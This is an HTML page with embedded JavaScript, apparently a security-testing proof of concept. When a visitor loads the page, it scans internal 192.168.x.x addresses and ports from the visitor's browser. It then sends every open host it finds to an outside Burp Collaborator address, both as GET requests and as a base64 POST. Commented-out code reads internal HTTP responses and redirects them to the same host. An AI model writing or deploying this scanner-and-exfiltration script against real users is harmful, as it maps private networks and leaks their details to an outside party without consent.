<html>
<head></head>
<body>
<script>
var portsCheck = function(callback, target, port, timeout) {

	var timeout = (timeout == null) ? 100 : timeout;
    var img = new Image();

    img.onerror = function() {
        if (!img) return;
        img = undefined;
        callback(target, port, 'open');
    };

    img.onload = img.onerror;
    img.src = 'http://' + target + ':' + port;

    setTimeout(function() {
        if (!img) return;
        img = undefined;
        callback(target, port, 'closed');
    }, timeout);
};
function range(start, count) {
  return Array.apply(0, Array(count)).map((element, index) => index + start); 
}
function httpGet(url)
{
    var req = new XMLHttpRequest();
	req.open("GET", url, false);
	//req.withCredentials = true;
	req.send();
	var data = req.responseText;
	console.log(data);
    return data;
}
function httpPost(url, data) {
	var xhr = new XMLHttpRequest();
	xhr.open('POST', url, false);
	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	xhr.onload = function () {
		// do something to response
		console.log(this.responseText);
	};
	xhr.send(data);
}
function b64_encode(s) {
	return btoa(s); //and atob()
}

///////////////////////////////////////////
// List of ports to scan
var burp_collab = "https://mb1v6ylvrm41wndc1qnfqxsmldr3fs.burpcollaborator.net"

// testing locally
var ports = [80];
var network = "192.168.86.";
var ip_range = range(66,1);

// lab test
/*
var ports = [8080];
var network = "192.168.0.";
var ip_range = range(0,255);
*/





//var data = httpGet("https://192.168.86.66:443");
//var data = httpGet("http://192.168.0.7:8080");
//console.log(b64_encode(data));

//document.location = burp_collab+'/log?data='+b64_encode(data);
//console.log(httpPost(burp_collab, b64_encode(httpGet("http://192.168.0.51:8080"))));

/*
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://192.168.0.51:8080',true);
req.withCredentials = false;
req.send();
function reqListener() {
var obj = JSON.parse(this.responseText);
location=burp_collab+'/log?data='+obj;
};
*/



// Loop through IPs
console.log("start scanning")
var arr = [];
for (var i = 0; i < ip_range.length; i++) {
	var ip = network+ip_range[i];

	// Loop through ports
	for (var a = 0; a < ports.length; a++) {

		// Find open ports
		portsCheck(function(target, port, status) {
			var target = target + ":" + port;
			// Open port found
			if (status == "open") {
				console.log(target, port, status);
				arr.push(target);
				httpGet(burp_collab+"/log?data="+target);
			}
		}, ip, ports[a], 1000);
	}
}
console.log("done scanning")
console.log(arr);
console.log("send data to burp")
httpPost(burp_collab, b64_encode(arr));

</script>
</body>
</html>